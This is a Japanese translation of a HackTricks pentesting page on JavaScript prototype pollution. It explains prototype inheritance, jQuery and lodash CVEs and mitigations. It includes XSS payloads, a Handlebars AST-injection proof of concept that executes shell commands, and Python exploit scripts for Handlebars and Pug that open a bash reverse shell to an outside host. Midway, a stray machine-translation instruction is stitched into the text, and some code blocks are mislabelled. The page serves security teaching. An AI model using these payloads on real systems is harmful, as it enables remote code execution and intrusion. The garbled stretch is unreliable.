# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## JavaScriptのオブジェクト <a href="#053a" id="053a"></a>

まず、JavaScriptの`Object`を理解する必要があります。オブジェクトは単にキーと値のペアの集合で、そのオブジェクトのプロパティとよく呼ばれます。例えば：

![](<../../../.gitbook/assets/image (389) (1).png>)

JavaScriptでは、`Object`は基本的なオブジェクトであり、新しく作成されたオブジェクトのテンプレートです。`null`を`Object.create`に渡すことで空のオブジェクトを作成することができます。しかし、新しく作成されたオブジェクトは渡されたパラメータに対応する型を持ち、すべての基本的なプロパティを継承します。
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

以前、JavaScriptのオブジェクトはキーと値の集合であることを学びました。そのため、`null` オブジェクトは単なる空の辞書である `{}` と理解するのは理にかなっています。

## JavaScriptの関数/クラス <a href="#55dd" id="55dd"></a>

JavaScriptでは、クラスと関数の概念はかなり密接に関連しています（関数自体がクラスのコンストラクタとして機能し、実際にはJavaScriptには「クラス」という概念がありません）。次の例を見てみましょう：
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
```markdown
![](<../../../.gitbook/assets/image (361).png>)
```
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScriptのプロトタイプ <a href="#3843" id="3843"></a>

コード実行時にプロトタイプ属性を変更・修正・削除できる点に注意が必要です。例えば、クラスに関数を動的に追加することができます：

![](<../../../.gitbook/assets/image (363).png>)

クラスの関数も変更できます（以下のケースのように`toString`や`valueOf`など）：

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## 継承

プロトタイプベースのプログラムでは、オブジェクトはクラスからプロパティ/メソッドを継承します。クラスは、別のクラスのインスタンスにプロパティ/メソッドを追加するか、空のオブジェクトに追加することで派生します。

オブジェクトにプロパティを追加すると、そのオブジェクトがプロトタイプとして使用されているオブジェクト群（myPersonObjのような）も新しいプロパティを獲得しますが、特に呼び出されない限り、そのプロパティは表示されません。

![](<../../../.gitbook/assets/image (366).png>)

## \_\_proto\_\_ 汚染 <a href="#0d0a" id="0d0a"></a>

**JavaScript内のすべてのオブジェクトは単なるキーと値のペアの集合であり**、**すべてのオブジェクトはJavaScriptのObject型から継承される**ということは既に学んだはずです。これは、Object型を汚染できれば、**環境内のすべてのJavaScriptオブジェクトが汚染される**ということを意味します！

これは非常に簡単で、任意のJavaScriptオブジェクトからいくつかのプロパティ（キーと値のペア）を変更できるようになるだけで良いのです。なぜなら、各オブジェクトはObjectから継承しているため、Objectのスキーマにアクセスできるからです。
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
前の例から、以下の方法を使用してObjectの構造にアクセスできます：
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
したがって、以前に述べたように、Objectスキーマにプロパティが追加されると、すべてのJavaScriptオブジェクトが新しいプロパティにアクセスできるようになります：
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
```markdown
これで、各JSオブジェクトには新しいプロパティが含まれるようになります：関数 `printHello` と新しい定数 `globalconstant`

## プロトタイプ汚染

この技術は、JSオブジェクトのスキーマを汚染することができないため、前述の技術ほど効果的ではありません。しかし、**キーワード `__proto__` が禁止されている場合には、この技術が役立つことがあります**。

関数のプロパティを変更できる場合、関数の `prototype` プロパティを変更でき、**ここに追加された新しいプロパティは、その関数から作成された各オブジェクトに継承されます：**
```
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
この場合、**`person` クラスから作成されたオブジェクトのみ**が影響を受けますが、それぞれが**`sayHello` と `newConstant` プロパティを継承**するようになります。

**プロトタイプ汚染を悪用して、すべての JS オブジェクトを汚染する方法は2つあります。**

一つ目は、**Object** のプロトタイププロパティを汚染することです（前述の通り、すべての JS オブジェクトはこれを継承しています）：
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
```markdown
もしそれを実行できれば、各JSオブジェクトは関数 `sayBye` を実行することができるようになります。

もう一つの方法は、以下の例のように辞書変数のコンストラクタのプロトタイプを汚染することです：
```
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
実行後、**各JSオブジェクトは`sayHey`関数を実行できるようになります**。

## 他のオブジェクトを汚染する

### クラスから`Object.prototype`へ

特定のオブジェクトを**汚染できる**シナリオで、**`Object.prototype`に到達する**必要がある場合、次のようなコードで探すことができます：
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### 配列要素の汚染

JSでオブジェクトの属性を汚染できるように、配列を汚染するアクセス権がある場合、**インデックス**でアクセス可能な配列の**値を汚染**することもできることに注意してください（値を上書きすることはできませんので、何らかの方法で使用されているが書き込まれていないインデックスを汚染する必要があります）。
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html要素の汚染

JSを介してHTML要素を生成する際、**`innerHTML`** 属性を**上書き**して、**任意のHTMLコード**を書き込むことが可能です。[このアイデアと例はこのライトアップから](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## 例

### 基本的な例

プロトタイプ汚染はどこで起こるのでしょうか？それは、アプリケーションにバグがあり、`Object.prototype`のプロパティを上書きできるようになるときに発生します。通常のオブジェクトはすべてそのプロパティを`Object.prototype`から継承しているため、アプリケーションの挙動を変更することができます。最も一般的に示される例は次のとおりです：
```javascript
if (user.isAdmin) {   // do something important!}
```
想像してみてください。プロトタイプ汚染があり、`Object.prototype.isAdmin = true`を設定できるとします。その場合、アプリケーションが明示的に値を割り当てていない限り、`user.isAdmin`は常にtrueです！

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

例えば、`obj[a][b] = value`です。攻撃者が`a`と`value`の値を制御できる場合、`a`の値を`__proto__`に調整するだけで良いです（javascriptでは、`obj["__proto__"]`と`obj.__proto__`は完全に同等です）。すると、アプリケーション内のすべての既存オブジェクトのプロパティ`b`が`value`に割り当てられます。

しかし、攻撃は上記のように単純ではありません。[論文](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)によると、次の3つの条件のいずれかが満たされた場合にのみ攻撃が可能です：

* 再帰的なマージを実行する
* パスによるプロパティの定義
* オブジェクトのクローン

### 関数のオーバーライド
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution から RCE へ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## クライアントサイドの prototype pollution から XSS へ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: jQuery $ .extend を通じた Prototype pollution 攻撃

$ .extend は、誤って扱うと、アプリ内のオブジェクトの `prototype`（オブジェクトのテンプレート）のプロパティを変更することができます。この属性はその後、すべてのオブジェクトに表示されます。注意すべきは、$ .extend の「深い」バージョン（つまり g）のみが影響を受けるということです。

プログラマーは、この関数を使用してオブジェクトを複製したり、デフォルトオブジェクトから新しいプロパティを埋めたりすることがよくあります。例えば：

（`myObject` がユーザーからの入力フィールドであり、DB にシリアライズされると想像できます）

このコードでは、実行時に `isAdmin` 属性を新しく作成されたオブジェクトに割り当てるとよく考えられます。しかし実際には、`{}` に直接割り当てられ、その後 `{}.isAdmin` は `true` になります。このコードの後に、次のようなチェックを行うと：
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
```markdown
ユーザーがまだ存在していない場合（`undefined`）、プロパティ`isAdmin`はその親オブジェクトで検索されます。これは、上記で`true`の値を持つ`isAdmin`が追加されたObjectです。

JQuery 3.3.1で実行された別の例：
```
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
これらのエラーは多くのJavascriptプロジェクト、特にNodeJSプロジェクトに影響を与える可能性があります。最も実用的な例は、2018年12月にMongoDBを操作するのに役立つJSライブラリであるMongooseでのエラーです。

### CVE-2018–3721、CVE-2019–10744: lodashを通じたプロトタイプ汚染攻撃

[Lodash](https://www.npmjs.com/package/lodash)もまた、週に1900万回以上ダウンロードされるなど、多くの異なる機能を提供し、コードをより便利に、よりきれいに書くのに役立つよく知られたライブラリです。そして、JQueryと同じ問題を抱えていました。

**CVE-2018–3721**

**CVE-2019–10744**

このバグはLodashのすべてのバージョンに影響を与え、バージョン4.17.11で修正されました。

### CVEを使用した別のチュートリアル

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

## ASTプロトタイプ汚染

NodeJSでは、ASTはテンプレートエンジンやTypeScriptなど、JSで本当に頻繁に使用されます。\
テンプレートエンジンの構造は上記の通りです。

![img](https://blog.p6.is/img/2020/08/graph_3.jpg)

### Handlebars

情報は[https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)から取得しました。

`Object.prototype.pendingContent`に任意の文字列を挿入して、攻撃の可能性を判断できます。\
これにより、ブラックボックス環境でプロトタイプ汚染が存在する場合、サーバーがhandlebarsエンジンを使用していることを確認できます。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js -->

...
appendContent: function appendContent(content) {
if (this.pendingContent) {
content = this.pendingContent + content;
} else {
this.pendingLocation = this.source.currentLocation;
}

this.pendingContent = content;
},
pushSource: function pushSource(source) {
if (this.pendingContent) {
this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation));
this.pendingContent = undefined;
}

if (source) {
this.source.push(source);
}
}
...
```
以下は、ハッキング技術についてのハッキング書籍の内容です。ファイル `pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md` から関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、単語 'leak'、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

これは `javascript-compiler.js` の `appendContent` 関数によって行われます。
`appendContent` はこれです。`pendingContent` が存在する場合、コンテンツに追加して返します。

`pushSource` は `pendingContent` を `undefined` にすることで、文字列が複数回挿入されるのを防ぎます。

**エクスプロイト**

![img](https://blog.p6.is/img/2020/08/graph_5.jpg)

Handlebarsは上のグラフに示されているように動作します。

レキサーとパーサーがASTを生成した後、`compiler.js` に渡されます。
コンパイラが生成したテンプレート関数をいくつかの引数で実行することができ、"Hello posix"（msgがposixの場合）のような文字列を返します。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js -->

case 36:
this.$ = { type: 'NumberLiteral', value: Number($$[$0]), original: Number($$[$0]), loc: yy.locInfo(this._$) };
break;
```
```markdown
handlebarsのパーサーは、NumberLiteral型のノードの値を常にNumberコンストラクタを通じて数値にするよう強制します。しかし、プロトタイプ汚染を使用して、ここに非数値の文字列を挿入することができます。
```
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/base.js -->

function parseWithoutProcessing(input, options) {
// Just return if an already-compiled AST was passed in.
if (input.type === 'Program') {
return input;
}

_parser2['default'].yy = yy;

// Altering the shared object here, but this is ok as parser is a sync operation
yy.locInfo = function (locInfo) {
return new yy.SourceLocation(options && options.srcName, locInfo);
};

var ast = _parser2['default'].parse(input);

return ast;
}

function parse(input, options) {
var ast = parseWithoutProcessing(input, options);
var strip = new _whitespaceControl2['default'](options);

return strip.accept(ast);
}
```
まず、compile関数を見てください。これはASTオブジェクトとテンプレート文字列の2つの入力方法をサポートしています。

input.typeが`Program`である場合、入力値は実際には文字列です。\
Parserは、これが既にparser.jsによって解析されたASTであると考え、何の処理もせずにコンパイラに送信します。
```javascript
<!-- /node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js -->

...
accept: function accept(node) {
/* istanbul ignore next: Sanity code */
if (!this[node.type]) {
throw new _exception2['default']('Unknown type: ' + node.type, node);
}

this.sourceNode.unshift(node);
var ret = this[node.type](node);
this.sourceNode.shift();
return ret;
},
Program: function Program(program) {
console.log((new Error).stack)
this.options.blockParams.unshift(program.blockParams);

var body = program.body,
bodyLength = body.length;
for (var i = 0; i < bodyLength; i++) {
this.accept(body[i]);
}

this.options.blockParams.shift();

this.isSimple = bodyLength === 1;
this.blockParams = program.blockParams ? program.blockParams.length : 0;

return this;
}
```
コンパイラはASTオブジェクト（実際には文字列）を`accept`メソッドに送ります。
そして、`accept`はコンパイラの`this[node.type]`を呼び出します。
その後、ASTのbody属性を取り、関数の構築に使用します。
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];


const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());

/*
function (container, depth0, helpers, partials, data) {
var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) {
if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {
return parent[propertyName];
}
return undefined
};

return ((stack1 = (lookupProperty(helpers, "undefined") || (depth0 && lookupProperty(depth0, "undefined")) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}), console.log(process.mainModule.require('child_process').execSync('id').toString()), {
"name": "undefined",
"hash": {},
"data": data,
"loc": {
"start": 0,
"end": 0
}
})) != null ? stack1 : "");
}
*/
```
**例**

[https://github.com/hughsk/flat/issues/105](https://github.com/hughsk/flat/issues/105)
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
### Pug

詳細情報は[https://blog.p6.is/AST-Injection/#Pug](https://blog.p6.is/AST-Injection/#Pug)にあります。
```python
import requests

TARGET_URL = 'http://p6.is:3000'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
## 防ぐにはどうすればいいですか？

* `Object.freeze` を使ってプロパティを凍結する（`Object.prototype`）
* アプリケーションのスキーマに従ってJSON入力に対するバリデーションを行う
* 再帰的なマージ関数を安全でない方法で使用しない
* プロトタイプチェーンに影響を与えないように、`Object.create(null)` のようなプロトタイププロパティを持たないオブジェクトを使用する
* `Object` の代わりに `Map` を使用する
* 定期的にライブラリの新しいパッチを更新する

## 参考文献

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS hacking をゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または **HackTricksをPDFでダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や [**telegramグループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのhackingトリックを**共有する**。

</details>
